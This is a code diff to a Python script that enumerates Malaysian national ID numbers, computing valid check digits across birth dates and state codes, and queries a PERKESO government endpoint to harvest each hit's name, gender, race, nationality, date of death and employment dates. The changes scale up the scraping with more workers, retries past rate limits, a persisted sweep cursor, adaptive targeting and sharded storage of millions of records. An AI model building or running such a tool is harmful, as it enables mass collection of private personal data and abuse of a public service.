@@ -27,7 +27,7 @@ Usage
     python ic_checker.py --mode 3 --ics 610212075425,920913235001 # manual
 """
 
-import argparse, random, json, os, time, signal, threading, queue, sys
+import argparse, random, json, os, time, signal, threading, queue, sys, glob
 from datetime import date, timedelta, datetime
 from collections import deque
 
@@ -41,14 +41,31 @@ API_URL          = "https://lindungfaedah.perkeso.gov.my/auth/script/check_ic.ph
 OUTPUT_DIR       = "ic_results"
 VALID_FILE       = os.path.join(OUTPUT_DIR, "master_valid.json")
 INVALID_FILE     = os.path.join(OUTPUT_DIR, "master_invalid.json")
+#  Result files are sharded (valid_1990.json, valid_1990_a.json, ...), so every
+#  existing shard is loaded when seeding state — otherwise we re-check millions
+#  of known ICs on each run and the scraped data is thrown away.
+VALID_GLOB       = os.path.join(OUTPUT_DIR, "valid_*.json")
+INVALID_GLOB     = os.path.join(OUTPUT_DIR, "master_invalid*.json")
 PROGRESS_FILE    = os.path.join(OUTPUT_DIR, "master_progress.json")
 
 INVALID_TTL_DAYS = 30
 DELAY_MIN        = 0.8    # 8 workers × 0.8s ≈ 10 req/s (auto-backs off on 429)
 DELAY_MAX        = 60.0   # max backoff
-WORKERS_MAX      = 3
+WORKERS_MAX      = 8
 FLUSH_EVERY      = 25
 STATS_EVERY      = 10
+
+#  Exploration band for the last three digits of the IC.
+#  Anything unproven can be widened with --seq-band, e.g. 0-999.
+SEQ_BAND         = (500, 650)   # births < 2000
+SEQ_BAND_2000    = (0, 500)     # births >= 2000
+
+#  Scheduling state that survives between runs: a cursor so coverage always
+#  moves forward, plus hit statistics so productive states/years get a bigger
+#  share of the next run.
+CURSOR_DIR       = os.path.join(OUTPUT_DIR, "cursors")
+STATS_FILE       = os.path.join(OUTPUT_DIR, "stats.json")
+RUN_LOG          = os.path.join("logs", "run-log.ndjson")
 
 IS_CI = os.environ.get("GITHUB_ACTIONS") == "true"
 
@@ -91,10 +108,10 @@ def compute_check_digit(digits11):
     rev = digits11[::-1]
     return (12 - (sum(rev[j]*WEIGHTS[j] for j in range(11)) % 11)) % 11
 
-def all_valid_sequences(yy, mm, dd, pb, year):
-    seq_range = range(0,500) if year >= 2000 else range(500,650)
+def all_valid_sequences(yy, mm, dd, pb, year, band=None):
+    lo, hi = band or (SEQ_BAND_2000 if year >= 2000 else SEQ_BAND)
     out = []
-    for s in seq_range:
+    for s in range(lo, hi):
         s_str    = str(s).zfill(3)
         digits11 = [int(ch) for ch in (yy+mm+dd+pb+s_str)]
         c        = compute_check_digit(digits11)
@@ -128,10 +145,23 @@ def random_date(from_year=1965, to_year=2000):
     return d.year, d.month, d.day
 
 # ── API ───────────────────────────────────────────────────────────────────────
-def check_perkeso(icno):
-    resp = requests.get(API_URL, params={"icno": icno}, timeout=10)
-    resp.raise_for_status()
-    return resp.json()
+def check_perkeso(icno, attempts=3):
+    """One API call with retries. Transient failures must never look like
+    'invalid' — a 5xx or timeout means we simply don't know yet."""
+    last = None
+    for i in range(attempts):
+        try:
+            resp = requests.get(API_URL, params={"icno": icno}, timeout=15)
+            resp.raise_for_status()
+            return resp.json()
+        except requests.exceptions.HTTPError as e:
+            last  = e
+            code  = e.response.status_code if e.response is not None else 0
+            if code != 429 and code < 500: raise
+        except requests.exceptions.RequestException as e:
+            last = e
+        time.sleep(min(2 ** i, 8) + random.random())
+    raise last
 
 # ── Rate Controller ───────────────────────────────────────────────────────────
 class RateController:
@@ -185,11 +215,11 @@ class PersistentState:
         today      = date.today()
         cutoff     = today - timedelta(days=INVALID_TTL_DAYS)
 
-        raw_valid          = self._load(VALID_FILE, [])
+        raw_valid          = self._load_many([VALID_FILE, VALID_GLOB], [])
         self._valid_records: list = raw_valid
         self._valid_ics: set      = {r.get("ic") or r.get("ic_number") for r in raw_valid}
 
-        raw_invalid  = self._load(INVALID_FILE, [])
+        raw_invalid  = self._load_many([INVALID_FILE, INVALID_GLOB], [])
         live, expired = [], []
         for e in raw_invalid:
             try:
@@ -207,6 +237,11 @@ class PersistentState:
         self.loaded_invalid = len(self._invalid_ics)
 
         if expired: self._write(INVALID_FILE, self._invalid_live)
+        else:
+            #  No expiry: only persist master_invalid.json when shards exist and
+            #  it is missing, so we never drop the TTL cache on a fresh checkout.
+            if not os.path.exists(INVALID_FILE) and raw_invalid:
+                self._write(INVALID_FILE, self._invalid_live)
 
     @property
     def valid_count(self):   return len(self._valid_ics)
@@ -275,6 +310,36 @@ class PersistentState:
             except: pass
         return default
 
+    @classmethod
+    def _load_many(cls, paths, default):
+        """Load several result files/globs; dedupe by IC, later files win."""
+        seen, out = set(), []
+        files = []
+        for p in paths:
+            hits = sorted(glob.glob(p)) if any(c in p for c in "*?[") else [p]
+            for h in hits:
+                if h not in files: files.append(h)
+        for f in files:
+            for rec in cls._load(f, []):
+                rec = cls._unpack(rec)
+                if not isinstance(rec, dict): continue
+                k = rec.get("ic") or rec.get("ic_number")
+                if not k or k in seen: continue
+                seen.add(k); out.append(rec)
+        return out or default
+
+    #  Shards store records as arrays to keep the repo small:
+    #  [ic, t, name, genderId, raceId, nationalityId, dateOfDeath, act4, act800]
+    COLS = ("ic", "t", "name", "genderId", "raceId", "nationalityId",
+            "dateOfDeath", "employmentStartDateAct4", "employmentStartDateAct800")
+
+    @classmethod
+    def _unpack(cls, rec):
+        if isinstance(rec, dict): return rec
+        if isinstance(rec, (list, tuple)):
+            return {c: v for c, v in zip(cls.COLS, rec) if v not in (None, "")}
+        return None
+
     @staticmethod
     def _write(path, data):
         tmp = path + ".tmp"
@@ -314,6 +379,79 @@ def write_progress(p):
     with open(tmp, "w", encoding="utf-8") as f:
         json.dump(p, f, default=str, separators=(',', ':'))
     os.replace(tmp, PROGRESS_FILE)
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  Sweep cursor + hit statistics  (per range, committed between runs)
+# ══════════════════════════════════════════════════════════════════════════════
+def _cursor_path(from_year, to_year):
+    return os.path.join(CURSOR_DIR, f"cursor_{from_year}_{to_year}.json")
+
+def load_cursor(from_year, to_year):
+    try:
+        c = json.load(open(_cursor_path(from_year, to_year), encoding="utf-8"))
+        if c.get("from_year") == from_year and c.get("to_year") == to_year:
+            return c
+    except Exception: pass
+    return {"from_year": from_year, "to_year": to_year, "year": from_year,
+            "month": 1, "pb_idx": 0, "seq": None, "cycle": 0}
+
+def save_cursor(c):
+    os.makedirs(CURSOR_DIR, exist_ok=True)
+    path = _cursor_path(c["from_year"], c["to_year"])
+    tmp  = path + ".tmp"
+    with open(tmp, "w", encoding="utf-8") as f:
+        json.dump(c, f, separators=(",", ":"))
+    os.replace(tmp, path)
+
+def band_of(year):
+    return SEQ_BAND_2000 if year >= 2000 else SEQ_BAND
+
+def load_stats():
+    try: return json.load(open(STATS_FILE, encoding="utf-8"))
+    except Exception: return {}
+
+def save_stats(st):
+    os.makedirs(OUTPUT_DIR, exist_ok=True)
+    tmp = STATS_FILE + ".tmp"
+    with open(tmp, "w", encoding="utf-8") as f:
+        json.dump(st, f, separators=(",", ":"))
+    os.replace(tmp, STATS_FILE)
+
+def sample_weight(st, kind, key, default=1.0):
+    """Smoothed hit rate -> multiplier. Unproven keys keep the population
+    prior (default); proven ones get a bigger share, dead ones are demoted
+    but never fully dropped."""
+    h = st.get("hit", {}).get(kind, {}).get(str(key), 0)
+    n = st.get("n",   {}).get(kind, {}).get(str(key), 0)
+    if n < 5: return default
+    return max(0.15, min(8.0, (h + 1) / (n + 4) * 4))
+
+def pick_state(st):
+    weights = [sample_weight(st, "state", pb) for pb in STATE_POOL]
+    return random.choices(STATE_POOL, weights=weights, k=1)[0]
+
+def log_run(record):
+    """Append one compact line per run — the automatic scrape log."""
+    try:
+        os.makedirs(os.path.dirname(RUN_LOG), exist_ok=True)
+        with open(RUN_LOG, "a", encoding="utf-8") as f:
+            f.write(json.dumps(record, separators=(",", ":")) + "\n")
+    except Exception as e:
+        safe_print(f"  ⚠ could not write run log: {e}")
+
+    summary = os.environ.get("GITHUB_STEP_SUMMARY")
+    if not summary:
+        return
+    try:
+        with open(summary, "a", encoding="utf-8") as f:
+            f.write(f"### run {record['range']} — {record['checked']:,} checked\n\n")
+            f.write("| metric | value |\n|---|---|\n")
+            f.write(f"| valid (hit) | {record['valid']:,} |\n")
+            f.write(f"| invalid | {record['invalid']:,} |\n")
+            f.write(f"| errors | {record['errors']:,} |\n")
+            f.write(f"| hit rate | {record['hit_rate']}% |\n")
+            f.write(f"| checks/min | {record['per_min']} |\n\n")
+    except Exception: pass
 
 def all_dates_in_range(from_year, to_year):
     """All valid calendar dates in range, sorted oldest→newest."""
@@ -575,11 +713,15 @@ def run_systematic(from_year, to_year, initial_workers, pstate, max_runtime=None
     print(f"  💾 Progress → {PROGRESS_FILE}  ({pct_now:.4f}% done)\n")
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  MODE 1 — Adaptive Random (fast hit finder)
+#  MODE 1 — Sweep + adaptive probes (fast hit finder)
 # ══════════════════════════════════════════════════════════════════════════════
-def run_adaptive(from_year, to_year, initial_workers, pstate, max_runtime=None):
+def run_adaptive(from_year, to_year, initial_workers, pstate, max_runtime=None,
+                 use_cursor=True):
+    """Sweep-forward scan with a persisted cursor, hot-DOB exploitation and a
+    random probe share. Coverage always advances, so successive runs never
+    re-tread the same ground, and every run is logged."""
     rate_ctrl  = RateController(initial_workers)
-    run_stats  = {"checked":0,"valid":0,"invalid":0,"errors":0}
+    run_stats  = {"checked":0,"valid":0,"invalid":0,"errors":0,"states":{}}
     shutdown   = threading.Event()
     task_q     = queue.Queue(maxsize=300)
     hot_dobs   = deque()
@@ -589,6 +731,17 @@ def run_adaptive(from_year, to_year, initial_workers, pstate, max_runtime=None):
     start_time = time.time()
     deadline   = (start_time + max_runtime * 60) if max_runtime else None
 
+    label = f"{from_year}-{to_year}"
+    cursor = load_cursor(from_year, to_year) if use_cursor else None
+    stats  = load_stats()
+    stats.setdefault("hit", {}).setdefault("state", {})
+    stats.setdefault("n",   {}).setdefault("state", {})
+    if cursor:
+        stats.setdefault("hit", {}).setdefault("year", {})
+        stats.setdefault("n",   {}).setdefault("year", {})
+        stats.setdefault("hit", {}).setdefault("seq", {})
+        stats.setdefault("n",   {}).setdefault("seq", {})
+
     def next_idx():
         with idx_lock: idx_cnt[0] += 1; return idx_cnt[0]
 
@@ -597,19 +750,55 @@ def run_adaptive(from_year, to_year, initial_workers, pstate, max_runtime=None):
         if deadline and time.time() >= deadline: return True
         return False
 
-    def enqueue_dob(year, month, day, pb, limit=None, shuffle=True):
+    def note(kind, key, hit):
+        stats["n"][kind][str(key)] = stats["n"][kind].get(str(key), 0) + 1
+        if hit:
+            stats["hit"][kind][str(key)] = stats["hit"][kind].get(str(key), 0) + 1
+
+    # ── Cursor advance: (year, month, state, sequence) → next slot ──
+    def next_slot():
+        lo, hi = band_of(cursor["year"])
+        if cursor.get("seq") is None:
+            cursor["seq"] = lo
+        slot = (cursor["year"], cursor["month"], ORDERED_PBS[cursor["pb_idx"]], cursor["seq"])
+
+        cursor["seq"] += 1
+        if cursor["seq"] >= hi:
+            cursor["seq"] = None
+            cursor["pb_idx"] += 1
+            if cursor["pb_idx"] >= len(ORDERED_PBS):
+                cursor["pb_idx"] = 0
+                cursor["month"] += 1
+                if cursor["month"] > 12:
+                    cursor["month"] = 1
+                    cursor["year"] += 1
+                    if cursor["year"] > to_year:
+                        cursor["year"] = from_year
+                        cursor["cycle"] += 1
+        save_cursor(cursor)
+        return slot
+
+    def days_in(year, month):
+        first = date(year, month, 1)
+        nxt   = date(year + (month == 12), month % 12 + 1, 1)
+        return (nxt - first).days
+
+    def enqueue(year, month, day, pb, seqs=None, limit=None, shuffle=True):
         yy  = str(year%100).zfill(2)
         mm  = str(month).zfill(2)
         dd  = str(day).zfill(2)
         key = f"{yy}{mm}{dd}{pb}"
         done = tried.setdefault(key, set())
-        cands = [c for c in all_valid_sequences(yy,mm,dd,pb,year) if c[0] not in done]
+        cands = all_valid_sequences(yy, mm, dd, pb, year)
+        if seqs is not None:
+            cands = [c for c in cands if c[0] in seqs]
+        cands = [c for c in cands if c[0] not in done]
         if shuffle: random.shuffle(cands)
         added = 0
         for seq, chk in cands:
             if should_stop(): return
             if limit and added >= limit: break
-            rec = make_ic_record(yy,mm,dd,pb,year,seq,chk)
+            rec = make_ic_record(yy, mm, dd, pb, year, seq, chk)
             if pstate.is_checked(rec["ic_number"]): continue
             done.add(seq)
             try: task_q.put(rec, timeout=3); added += 1
@@ -617,13 +806,27 @@ def run_adaptive(from_year, to_year, initial_workers, pstate, max_runtime=None):
 
     def producer():
         while not should_stop():
-            if hot_dobs:
-                yr,mo,dy,pb = hot_dobs.popleft()
-                enqueue_dob(yr,mo,dy,pb, limit=20, shuffle=False)
-            else:
-                yr,mo,dy = random_date(from_year, to_year)
-                pb = random.choice(STATE_POOL)
-                enqueue_dob(yr,mo,dy,pb, limit=5)
+            try:
+                # Hot DOB first: a hit means nearby sequences are worth probing.
+                if hot_dobs:
+                    yr, mo, dy, pb = hot_dobs.popleft()
+                    enqueue(yr, mo, dy, pb, limit=20, shuffle=False)
+                    continue
+                # 80% keep the sweep moving forward, 20% random probes for
+                # fresh signal outside the current slot.
+                if cursor and random.random() < 0.8:
+                    year, month, pb, seq = next_slot()
+                    n_days = days_in(year, month)
+                    picks  = random.sample(range(1, n_days + 1), min(12, n_days))
+                    for day in picks:
+                        if should_stop(): break
+                        enqueue(year, month, day, pb, seqs={seq}, limit=2, shuffle=False)
+                else:
+                    yr, mo, dy = random_date(from_year, to_year)
+                    enqueue(yr, mo, dy, pick_state(stats), limit=4)
+            except Exception as e:
+                safe_print(f"  ⚠ producer: {e}")
+                time.sleep(0.5)
         task_q.put(None)
 
     def worker():
@@ -633,7 +836,12 @@ def run_adaptive(from_year, to_year, initial_workers, pstate, max_runtime=None):
             if gen is None: task_q.put(None); break
             result = do_check(gen, next_idx(), rate_ctrl, pstate, run_stats,
                               store_invalid=True)
+            note("state", gen["pb_code"], result is True)
+            note("year",  gen["date_of_birth"][:4], result is True)
+            note("seq",   f"{gen['sequence']//25*25}", result is True)
             if result is True:
+                run_stats["states"][gen["pb_name"]] = \
+                    run_stats["states"].get(gen["pb_name"], 0) + 1
                 p = gen["date_of_birth"].split("-")
                 hot_dobs.append((int(p[0]),int(p[1]),int(p[2]),gen["pb_code"]))
             if should_stop(): shutdown.set()
@@ -645,10 +853,16 @@ def run_adaptive(from_year, to_year, initial_workers, pstate, max_runtime=None):
 
     limit_lbl = f"max {max_runtime} min" if max_runtime else "infinite"
     print("=" * 62)
-    print(f"  Adaptive Random  [{limit_lbl}]")
+    print(f"  Sweep + adaptive probes  [{limit_lbl}]")
     print(f"  DOB {from_year}–{to_year}  |  {initial_workers} workers  |  "
           f"{DELAY_MIN}–{DELAY_MAX}s delay")
     print(f"  ⏭  Skipping {pstate.total_checked:,} known ICs")
+    if cursor:
+        print(f"  📍 Cursor  {cursor['year']}-{str(cursor['month']).zfill(2)}  "
+              f"state {ORDERED_PBS[cursor['pb_idx']]}  "
+              f"cycle {cursor['cycle']}")
+        print(f"  💾 Cursor  → {_cursor_path(from_year, to_year)}")
+    print(f"  🧾 Run log → {RUN_LOG}")
     print("=" * 62 + "\n")
 
     prod    = threading.Thread(target=producer, daemon=True)
@@ -664,11 +878,31 @@ def run_adaptive(from_year, to_year, initial_workers, pstate, max_runtime=None):
 
     for w in workers: w.join(timeout=DELAY_MAX + 2)
     pstate.flush()
+    if cursor: save_cursor(cursor)
+    save_stats(stats)
 
-    c = run_stats
+    c      = run_stats
+    mins   = max((time.time() - start_time) / 60, 0.1)
+    record = {
+        "ts":       datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
+        "range":    label,
+        "minutes":  round(mins, 1),
+        "checked":  c["checked"],
+        "valid":    c["valid"],
+        "invalid":  c["invalid"],
+        "errors":   c["errors"],
+        "hit_rate": round(c["valid"] / c["checked"] * 100, 2) if c["checked"] else 0,
+        "per_min":  round(c["checked"] / mins, 1),
+        "cursor":   (f"{cursor['year']}-{cursor['month']:02d}/"
+                     f"{ORDERED_PBS[cursor['pb_idx']]}/{cursor['seq']}" if cursor else None),
+        "top_states": dict(sorted(c["states"].items(), key=lambda kv: -kv[1])[:5]),
+    }
+    log_run(record)
+
     print(f"\n{'='*62}")
     print(f"  Run done  |  {c['checked']} checked | ✅ {c['valid']} | "
           f"❌ {c['invalid']} | ⚠️  {c['errors']}")
+    print(f"  {record['per_min']}/min  |  hit rate {record['hit_rate']}%")
     print(f"  All-time: {pstate.valid_count} valid | {pstate.invalid_count} invalid")
     print(f"{'='*62}\n")
 
@@ -772,12 +1006,25 @@ def parse_args():
     p.add_argument("--pb",          type=str, default="10")
     p.add_argument("--ics",         type=str, default=None)
     p.add_argument("--ttl",         type=int, default=INVALID_TTL_DAYS)
+    p.add_argument("--seq-band",    type=str, default=None, dest="seq_band",
+                   help="LO-HI sequence range, e.g. 500-650 or 0-999 "
+                        "(default 500-650 for births <2000, 0-500 for >=2000)")
+    p.add_argument("--no-cursor",   action="store_true", dest="no_cursor",
+                   help="ignore the saved sweep cursor and stay purely random")
     return p.parse_args()
 
 
 if __name__ == "__main__":
     args = parse_args()
     INVALID_TTL_DAYS = args.ttl
+
+    if args.seq_band:
+        try:
+            lo, hi = (int(x) for x in args.seq_band.split("-"))
+            if not (0 <= lo < hi <= 1000): raise ValueError
+            SEQ_BAND = SEQ_BAND_2000 = (lo, hi)
+        except ValueError:
+            sys.exit(f"Bad --seq-band: {args.seq_band} (expected LO-HI, 0-1000)")
 
     os.makedirs(OUTPUT_DIR, exist_ok=True)
     print(f"\n  Loading state...")
@@ -796,7 +1043,8 @@ if __name__ == "__main__":
                            max_runtime=args.max_runtime)
         elif args.mode == 1:
             run_adaptive(args.from_year, args.to_year, workers, st,
-                         max_runtime=args.max_runtime)
+                         max_runtime=args.max_runtime,
+                         use_cursor=not args.no_cursor)
         elif args.mode == 2:
             if args.date:
                 try: yr,mo,dy = [int(x) for x in args.date.split("-")]
